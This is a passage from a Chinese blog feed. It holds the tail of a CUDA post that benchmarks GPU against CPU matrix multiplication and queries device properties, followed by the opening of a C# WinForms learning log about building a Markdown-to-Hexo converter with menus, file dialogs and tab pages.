<span class="title">matMulCPU</span><span class="params">(Matrix* A, Matrix* B, Matrix* C)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A-&gt;height; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; B-&gt;width; ++j) &#123;</span><br><span class="line">            <span class="type">float</span> sum = <span class="number">0.0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; A-&gt;width; ++k) &#123;</span><br><span class="line">                sum += A-&gt;elements[i * A-&gt;width + k] * B-&gt;elements[k * B-&gt;width + j];</span><br><span class="line">            &#125;</span><br><span class="line">            C-&gt;elements[i * C-&gt;width + j] = sum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> width = <span class="number">1</span> &lt;&lt; <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> height = <span class="number">1</span> &lt;&lt; <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 申请托管内存</span></span><br><span class="line">    Matrix* A, * B, * C, *D;</span><br><span class="line">    <span class="built_in">cudaMallocManaged</span>((<span class="type">void</span>**)&amp;A, <span class="built_in">sizeof</span>(Matrix));</span><br><span class="line">    <span class="built_in">cudaMallocManaged</span>((<span class="type">void</span>**)&amp;B, <span class="built_in">sizeof</span>(Matrix));</span><br><span class="line">    <span class="built_in">cudaMallocManaged</span>((<span class="type">void</span>**)&amp;C, <span class="built_in">sizeof</span>(Matrix));</span><br><span class="line">    <span class="built_in">cudaMallocManaged</span>((<span class="type">void</span>**)&amp;D, <span class="built_in">sizeof</span>(Matrix));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化数据</span></span><br><span class="line">    <span class="type">int</span> nBytes = width * height * <span class="built_in">sizeof</span>(<span class="type">float</span>);</span><br><span class="line">    <span class="built_in">cudaMallocManaged</span>((<span class="type">void</span>**)&amp;A-&gt;elements, nBytes);</span><br><span class="line">    <span class="built_in">cudaMallocManaged</span>((<span class="type">void</span>**)&amp;B-&gt;elements, nBytes);</span><br><span class="line">    <span class="built_in">cudaMallocManaged</span>((<span class="type">void</span>**)&amp;C-&gt;elements, nBytes);</span><br><span class="line">    <span class="built_in">cudaMallocManaged</span>((<span class="type">void</span>**)&amp;D-&gt;elements, nBytes);</span><br><span class="line"></span><br><span class="line">    A-&gt;height = height;</span><br><span class="line">    A-&gt;width = width;</span><br><span class="line">    B-&gt;height = height;</span><br><span class="line">    B-&gt;width = width;</span><br><span class="line">    C-&gt;height = height;</span><br><span class="line">    C-&gt;width = width;</span><br><span class="line">    D-&gt;height = height;</span><br><span class="line">    D-&gt;width = width;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; width*height; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        A-&gt;elements[i] = <span class="number">1.0f</span>;</span><br><span class="line">        B-&gt;elements[i] = <span class="number">2.0f</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义kernel的执行配置</span></span><br><span class="line">    <span class="function">dim3 <span class="title">blockSize</span><span class="params">(<span class="number">32</span>,<span class="number">32</span>)</span></span>;</span><br><span class="line">    <span class="function">dim3 <span class="title">gridSize</span><span class="params">((width + blockSize.x - <span class="number">1</span>) / blockSize.x, (height + blockSize.y - <span class="number">1</span>) / blockSize.y)</span></span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;blockSize: &quot;</span> &lt;&lt; blockSize.x &lt;&lt; <span class="string">&quot;x&quot;</span> &lt;&lt; blockSize.y &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;gridSize: &quot;</span> &lt;&lt; gridSize.x &lt;&lt; <span class="string">&quot;x&quot;</span> &lt;&lt; gridSize.y &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测量 GPU 计算时间</span></span><br><span class="line">    <span class="keyword">auto</span> start_gpu = std::chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line">    mul &lt;&lt; &lt; gridSize, blockSize &gt;&gt; &gt; (A, B, C);</span><br><span class="line">    <span class="built_in">cudaDeviceSynchronize</span>();</span><br><span class="line">    <span class="keyword">auto</span> end_gpu = std::chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line">    std::chrono::duration&lt;<span class="type">double</span>&gt; duration_gpu = end_gpu - start_gpu;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;GPU 计算时间: &quot;</span> &lt;&lt; duration_gpu.<span class="built_in">count</span>() &lt;&lt; <span class="string">&quot;秒&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测量 CPU 计算时间</span></span><br><span class="line">    <span class="keyword">auto</span> start_cpu = std::chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line">    <span class="built_in">matMulCPU</span>(A, B, C);</span><br><span class="line">    <span class="keyword">auto</span> end_cpu = std::chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line">    std::chrono::duration&lt;<span class="type">double</span>&gt; duration_cpu = end_cpu - start_cpu;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;CPU 计算时间: &quot;</span> &lt;&lt; duration_cpu.<span class="built_in">count</span>() &lt;&lt; <span class="string">&quot;秒&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放资源</span></span><br><span class="line">    <span class="built_in">cudaFree</span>(A-&gt;elements);</span><br><span class="line">    <span class="built_in">cudaFree</span>(B-&gt;elements);</span><br><span class="line">    <span class="built_in">cudaFree</span>(C-&gt;elements);</span><br><span class="line">    <span class="built_in">cudaFree</span>(D-&gt;elements);</span><br><span class="line">    <span class="built_in">cudaFree</span>(A);</span><br><span class="line">    <span class="built_in">cudaFree</span>(B);</span><br><span class="line">    <span class="built_in">cudaFree</span>(C);</span><br><span class="line">    <span class="built_in">cudaFree</span>(D);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>发现GPU计算的效率大概是CPU计算效率的30倍！</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/19/CUDA%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8B%E5%88%9D%E6%8E%A2/image-20250319174603371.png"
                      class=""
                >
<p><strong>获取 <code>blockSize</code> 和 <code>gridSize</code>
限制</strong></p>
<p>在 CUDA 中，<code>blockSize</code>（线程块大小）和
<code>gridSize</code>（网格大小）的上限取决于 <strong>GPU
的架构</strong>。这些上限可以使用 <strong>CUDA 设备查询 API</strong>
获取。可以使用 <code>cudaGetDeviceProperties()</code> 来查询
<strong>最大线程数、线程块大小和网格大小</strong>：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cuda_runtime.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cudaDeviceProp prop;</span><br><span class="line">    <span class="type">int</span> device;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">cudaGetDevice</span>(&amp;device);  <span class="comment">// 获取当前 GPU 设备编号</span></span><br><span class="line">    <span class="built_in">cudaGetDeviceProperties</span>(&amp;prop, device);  <span class="comment">// 获取设备属性</span></span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;设备名称: &quot;</span> &lt;&lt; prop.name &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;SM 数量: &quot;</span> &lt;&lt; prop.multiProcessorCount &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;最大线程块大小 (blockSize): &quot;</span> &lt;&lt; prop.maxThreadsPerBlock &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;每个维度的最大线程数 (blockDim): (&quot;</span></span><br><span class="line">              &lt;&lt; prop.maxThreadsDim[<span class="number">0</span>] &lt;&lt; <span class="string">&quot;, &quot;</span> </span><br><span class="line">              &lt;&lt; prop.maxThreadsDim[<span class="number">1</span>] &lt;&lt; <span class="string">&quot;, &quot;</span></span><br><span class="line">              &lt;&lt; prop.maxThreadsDim[<span class="number">2</span>] &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;最大网格大小 (gridSize): (&quot;</span></span><br><span class="line">              &lt;&lt; prop.maxGridSize[<span class="number">0</span>] &lt;&lt; <span class="string">&quot;, &quot;</span> </span><br><span class="line">              &lt;&lt; prop.maxGridSize[<span class="number">1</span>] &lt;&lt; <span class="string">&quot;, &quot;</span></span><br><span class="line">              &lt;&lt; prop.maxGridSize[<span class="number">2</span>] &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="参考内容">参考内容</h4>
<ul>
<li>https://zhuanlan.zhihu.com/p/34587739</li>
</ul>
]]></content>
      <categories>
        <category>HPC</category>
      </categories>
      <tags>
        <tag>HPC</tag>
        <tag>CUDA</tag>
      </tags>
  </entry>
  <entry>
    <title>C#开发windows程序学习记录</title>
    <url>/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="c开发学习记录1">C#开发学习记录1</h2>
<p>开发环境：Visual Studio 2022</p>
<h4 id="前言">前言</h4>
<p>从高中时就对开发软件比较感兴趣，用过pygame写过小游戏，当时其实也想用Unity来写个游戏来着。不过高中确实学业压力比较重，加上Unity主要是用C#作为编程语言的，当时也没接触过C#语言，就不了了之。大一又误入安全歧途:smirk:，一直在打ctf，现在趁寒假学点windows程序开发。一开始我看了b站上的视频学习windows程序设计，用的是windows
api，不过都是上古（指5年前）的产物了。后面一问gpt才发现，C#是 Windows
应用程序开发的首选语言，尤其是对于快速开发而言。这里就不再从基础语法学起，直接结合ai智慧搓一个小项目来学习吧。</p>
<p>因为我平时做学习的记录都是直接用markdown记录，那么如果想将文章部署到我的博客</p>
<p>这里我们的项目目标是将一般的Markdown文件转换成Hexo特定主题的文章格式，其实hexo是可以直接解析markdown语法，但是需要手动把图片复制到特定目录下，并且图片的显示却会出现问题。看了hexo的开发文档发现可以用<code>&#123;% asset_img img_name %&#125;</code>来指定显示的图片。那么我们可以就以这个目标来学习windows的程序开发。</p>
<p>先安装个AI辅助插件，增加效率。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125125053180.png"
                      class=""
                >
<h4 id="功能设计">功能设计</h4>
<ol type="1">
<li><strong>用户界面 (UI) 设计</strong></li>
</ol>
<ul>
<li>功能
<ul>
<li>提供直观的图形界面，让用户轻松完成文件选择、设置和 Markdown
文件转换。</li>
</ul></li>
<li>具体实现
<ul>
<li><strong>文件选择界面</strong>：使用 <code>TreeView</code> 或
<code>ListView</code> 显示文件夹结构，支持拖拽文件。</li>
<li><strong>设置界面</strong>：使用
<code>TextBox</code>、<code>ComboBox</code> 等控件来输入 Hexo
路径、选择主题、设置发布模式，切换语言等。</li>
<li><strong>进度显示和日志</strong>：在转换和处理过程中，显示进度条、日志或消息提示，帮助用户了解当前操作进展。</li>
<li><strong>错误提示</strong>：当出现错误时，显示友好的错误消息，帮助用户解决问题。</li>
</ul></li>
</ul>
<ol start="2" type="1">
<li><strong>设置界面 (Settings Interface)</strong></li>
</ol>
<ul>
<li>功能
<ul>
<li>设置 Hexo 本地路径，让程序知道 Hexo 文件夹的位置。</li>
<li>设置显示字体与大小。</li>
<li>选择 Hexo 主题，或者设置 Hexo 相关配置项。</li>
<li>设置显示语言</li>
</ul></li>
<li>具体实现
<ul>
<li><p>使用表单控件（例如 <code>TextBox</code>、<code>ComboBox</code>
等）来接收用户输入的路径、模式和主题等信息。</p></li>
<li><p>使用 <code>FolderBrowserDialog</code> 来允许用户选择本地 Hexo
路径。</p></li>
<li><p>提供保存设置的功能，可以将用户选择的路径和设置保存到配置文件中（如
<code>.json</code> 或 <code>.xml</code>
格式）或者注册表中，保证下次启动时能够恢复。</p></li>
<li></li>
</ul></li>
</ul>
<ol start="3" type="1">
<li><strong>Markdown 转换和图片处理功能 (Markdown Conversion and Image
Handling)</strong></li>
</ol>
<ul>
<li>功能
<ul>
<li>将用户选定的 Markdown 文件转为 Hexo 特定主题的文章格式。</li>
<li>自动处理图片，复制到 Hexo 主题的特定目录，并使用 Hexo
的图片语法（例如 <code>&#123;% asset_img img_name %&#125;</code>）来引用图片。</li>
</ul></li>
<li>具体实现
<ul>
<li>解析 Markdown
文件内容，是直接使用文件IO操作，增加和替换特定内容。</li>
<li>提取 Markdown 文件中的图片路径并处理：
<ul>
<li>将图片文件复制到 Hexo 主题目录中的 <code>/source/images/</code>
或其他指定目录。</li>
<li>在生成的文章中，使用 Hexo 语法 <code>&#123;% asset_img img_name %&#125;</code>
来引用图片。</li>
</ul></li>
<li>图片复制时，检查目标目录是否已经有相同的文件，避免覆盖。</li>
<li>可以使用正则表达式或其他文本处理方法来解析和替换 Markdown
中的图片路径。</li>
</ul></li>
</ul>
<ol start="4" type="1">
<li><strong>插件系统 (Plugin System)</strong></li>
</ol>
<ul>
<li>功能
<ul>
<li>允许未来扩展，比如自动获取 Hexo 特定主题配置、提供更多 Hexo
主题支持、图像优化等。</li>
<li>可以支持插件的安装、卸载和更新。</li>
</ul></li>
<li>具体实现
<ul>
<li>设计插件接口，允许通过 DLL 动态加载插件。</li>
<li>使用 C# 的反射（Reflection）机制动态加载插件并调用其中的功能。</li>
<li>设计一个简单的插件管理器，允许用户选择和管理插件。</li>
</ul></li>
</ul>
<ol start="6" type="1">
<li><strong>可拓展性和未来计划</strong></li>
</ol>
<ul>
<li>功能
<ul>
<li>未来可以加入更多的 Hexo 特定功能，如一键获取和配置 Hexo
特定主题，自动生成页面摘要、标签等。</li>
<li>也可以扩展支持其他平台的静态网站生成器，或者为用户提供更多的
Markdown 格式转换选项。</li>
</ul></li>
<li>具体实现
<ul>
<li>通过插件架构，将新功能封装为独立的插件，用户可以根据需求安装和启用。</li>
<li>提供 SDK 或文档，允许第三方开发者为项目开发自定义插件。</li>
</ul></li>
</ul>
<h4 id="ui界面设计">UI界面设计</h4>
<h5 id="菜单栏实现">菜单栏实现</h5>
<p>创建好项目后，将会看到一个默认的窗体（Form）。默认情况下，Visual
Studio 会打开窗体的设计视图（设计器视图），可以在这里设计界面。</p>
<p>比如我们要<strong>添加按钮组件</strong>，就可以在
<strong>设计视图</strong>
中，你可以通过工具箱拖放控件来创建界面元素。</p>
<ol type="1">
<li>打开 <strong>工具箱</strong>（通常位于 Visual Studio
窗口的左侧，如果没有看到工具箱，可以通过 <strong>视图 &gt;
工具箱</strong> 打开）。</li>
<li>在 <strong>工具箱</strong> 中，找到
<strong>按钮</strong>（Button）控件。</li>
<li>将按钮从工具箱中拖动到窗体上。</li>
<li>放置按钮后，你可以调整按钮的位置、大小以及其他属性。</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125132903827.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125133204899.png"
                      class=""
                >
<p>之后就会创建button1的组件，我们可以在button1_Click中设计其被点击后的行为。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125133318279.png"
                      class=""
                >
<p>不过常见的菜单栏组件一般为<strong>MenuStrip</strong>控件，而不是靠button的堆叠。这里我们的目标是先实现一个菜单栏，里面有打开、设置、插件和帮助四个选项。过程就是从工具箱中选<strong>MenuStrip</strong>拖到设计图中。我们还可以设置子菜单，但这里我们先从简单的功能实现起，暂时不用子菜单。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125134843093.png"
                      class=""
                >
<p>接下来我们要实现的是点击 <strong>File</strong>
菜单后，显示本机目录选择对话框，并将选中的文件目录保存到某个变量。首先我们来看一下<strong>InitializeComponent</strong>的实现，这里所有菜单组件的实现都类似，所以我们只用看一个<strong>File</strong>组件对应的实现。实际上，这些代码都是自动生成的，不需要我们更改。但为了更好理解过程，这里进行细致的学习。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125140341460.png"
                      class=""
                >
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// menuStrip1</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">this</span>.menuStrip1.ImageScalingSize = <span class="keyword">new</span> System.Drawing.Size(<span class="number">20</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Items.AddRange(<span class="keyword">new</span> System.Windows.Forms.ToolStripItem[] &#123;</span><br><span class="line"><span class="keyword">this</span>.FileToolStripMenuItem,</span><br><span class="line"><span class="keyword">this</span>.SettingsToolStripMenuItem,</span><br><span class="line"><span class="keyword">this</span>.PluginsToolStripMenuItem,</span><br><span class="line"><span class="keyword">this</span>.HelpToolStripMenuItem&#125;);</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Location = <span class="keyword">new</span> System.Drawing.Point(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Name = <span class="string">&quot;menuStrip1&quot;</span>;</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Size = <span class="keyword">new</span> System.Drawing.Size(<span class="number">948</span>, <span class="number">28</span>);</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.TabIndex = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Text = <span class="string">&quot;menuStrip1&quot;</span>;</span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// FileToolStripMenuItem</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">this</span>.FileToolStripMenuItem.Name = <span class="string">&quot;FileToolStripMenuItem&quot;</span>;</span><br><span class="line"><span class="keyword">this</span>.FileToolStripMenuItem.Size = <span class="keyword">new</span> System.Drawing.Size(<span class="number">48</span>, <span class="number">24</span>);</span><br><span class="line"><span class="keyword">this</span>.FileToolStripMenuItem.Text = <span class="string">&quot;File&quot;</span>;</span><br><span class="line"><span class="keyword">this</span>.FileToolStripMenuItem.Click += <span class="keyword">new</span> System.EventHandler(<span class="keyword">this</span>.FileToolStripMenuItem_Click);</span><br></pre></td></tr></table></figure></div>
<p><code>menuStrip1</code>：这是菜单栏的容器控件，负责将菜单项（如
<strong>File</strong>）显示在窗体顶部。</p>
<p><code>FileToolStripMenuItem</code>：这是菜单栏中的一个菜单项，用来表示
<strong>File</strong> 菜单。</p>
<p><code>this.menuStrip1.Items.AddRange(...)</code>：将多个组件添加到
<code>menuStrip1</code> 中，表示在菜单栏中添加 <strong>File</strong>
、<strong>Settings</strong>等菜单项。</p>
<p><code>this.FileToolStripMenuItem.Click += new System.EventHandler(this.FileToolStripMenuItem_Click);</code>：这行代码表示当点击
<strong>File</strong> 菜单项时，会触发
<code>FileToolStripMenuItem_Click</code> 方法。</p>
<p>其余一些设置名称和设置大小的内容就不作赘述。</p>
<h5 id="可视化文件选取实现">可视化文件选取实现</h5>
<p><strong>FileToolStripMenuItem_Click</strong>实现如下（在Form1.cs中），是用<strong>OpenFileDialog</strong>实现可视化菜单。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.ComponentModel;</span><br><span class="line"><span class="keyword">using</span> System.Data;</span><br><span class="line"><span class="keyword">using</span> System.Drawing;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Markdown2Hexo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">Form1</span> : <span class="title">Form</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 用于保存选中的文件夹路径</span></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> selectedFilePath;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Form1</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            InitializeComponent();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">FileToolStripMenuItem_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 创建文件选择对话框</span></span><br><span class="line">            <span class="keyword">using</span> (OpenFileDialog fileDialog = <span class="keyword">new</span> OpenFileDialog())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 设置对话框的描述</span></span><br><span class="line">                fileDialog.Title = <span class="string">&quot;请选择文件&quot;</span>;</span><br><span class="line">                fileDialog.Filter = <span class="string">&quot;Markdown 文件 (*.md)|*.md|所有文件 (*.*)|*.*&quot;</span>; <span class="comment">// 你可以根据需要设置过滤器</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 显示文件选择对话框并检查用户是否选择了文件</span></span><br><span class="line">                <span class="keyword">if</span> (fileDialog.ShowDialog() == DialogResult.OK)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 获取选中的文件路径</span></span><br><span class="line">                    selectedFilePath = fileDialog.FileName;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 显示选中文件的路径</span></span><br><span class="line">                    MessageBox.Show(<span class="string">$&quot;您选择的文件路径是: <span class="subst">&#123;selectedFilePath&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 你可以在这里处理选中的文件</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125141650926.png"
                      class=""
                >
<p>获取到了选择的文件后，就可以进行进一步的处理了。为了将业务逻辑和具体的功能处理应该尽量与界面逻辑分离，所以我们要新建一个<strong>FileProcessor</strong>类，里面创建<strong>ProcessMarkdownFile</strong>方法来用于实现业务逻辑。而在Form1.cs中可以简单的创建对象并调用其方法。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Form1.cs</span></span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (fileDialog.ShowDialog() == DialogResult.OK)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 获取选中的文件路径</span></span><br><span class="line">    selectedFilePath = fileDialog.FileName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理选中的文件</span></span><br><span class="line">    FileProcessor processor = <span class="keyword">new</span> FileProcessor();</span><br><span class="line">    processor.ProcessMarkdownFile(selectedFilePath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//FileProcessor.cs</span></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Markdown2Hexo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">FileProcessor</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 处理Markdown文件</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ProcessMarkdownFile</span>(<span class="params"><span class="built_in">string</span> filePath</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">			......</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h5 id="窗口大小获取">窗口大小获取</h5>
<p>获取各组件大小是设计UI的关键内容。</p>
<p>获取整个窗口的大小</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取窗口的大小（不包括标题栏和边框）</span></span><br><span class="line">Size windowSize = <span class="keyword">this</span>.ClientSize;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取窗口的总大小（包括标题栏和边框）</span></span><br><span class="line">Size totalWindowSize = <span class="keyword">this</span>.Size;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示结果</span></span><br><span class="line">MessageBox.Show(<span class="string">$&quot;Window Size: <span class="subst">&#123;windowSize.Width&#125;</span> x <span class="subst">&#123;windowSize.Height&#125;</span>\n&quot;</span> +</span><br><span class="line">                <span class="string">$&quot;Total Window Size: <span class="subst">&#123;totalWindowSize.Width&#125;</span> x <span class="subst">&#123;totalWindowSize.Height&#125;</span>&quot;</span>);</span><br></pre></td></tr></table></figure></div>
<p>获取 <code>MenuStrip</code> 的大小</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取 MenuStrip 的大小</span></span><br><span class="line">Size menuStripSize = menuStrip1.Size;</span><br><span class="line"><span class="comment">// 显示结果</span></span><br><span class="line">MessageBox.Show(<span class="string">$&quot;MenuStrip Size: <span class="subst">&#123;menuStripSize.Width&#125;</span> x <span class="subst">&#123;menuStripSize.Height&#125;</span>&quot;</span>);</span><br></pre></td></tr></table></figure></div>
<h5 id="单窗口页面切换实现">单窗口页面切换实现</h5>
<p>之后我们先不急于实现业务逻辑，继续设计settings的UI。这里我不想弹出一个新的窗体进行窗口配置，目标就是在原先窗口中能有窗口选项卡进行切换。这里可以选择用<strong>TabControl</strong>组件进行实现。当用户点击
<code>MenuStrip</code> 中的 <code>Settings</code> 或 <code>Help</code>
等菜单项时，在 <strong>TabControl</strong> 中动态创建一个对应的
<strong>TabPage</strong>
组件。每个<strong>TabPage</strong>都能够往里面add各种控件，相当于一个我们要设计的页面，而主窗口显示哪个<strong>TabPage</strong>就是由<strong>TabControl</strong>进行控制。</p>
<p>先了解下<strong>TabControl</strong>的常用属性与方法：</p>
<p><strong>常用属性</strong></p>
<ol type="1">
<li><p><strong><code>SelectedTab</code></strong></p>
<p>获取或设置当前选中的 <code>TabPage</code>。</p>
<p><strong>类型</strong>: <code>TabPage</code></p></li>
<li><p><strong><code>TabPages</code></strong></p>
<p>获取包含所有选项卡的
<code>TabPageCollection</code>，可以通过该属性访问、添加、删除选项卡。</p>
<p><strong>类型</strong>: <code>TabPageCollection</code></p></li>
<li><p><strong><code>TabCount</code></strong></p>
<p>获取 <code>TabControl</code> 中的选项卡数目。</p>
<p><strong>类型</strong>: <code>int</code></p></li>
<li><p><strong><code>Alignment</code></strong></p>
<p>获取或设置选项卡的对齐方式（例如，顶部、底部、左侧或右侧）。</p>
<p><strong>类型</strong>: <code>TabAlignment</code></p>
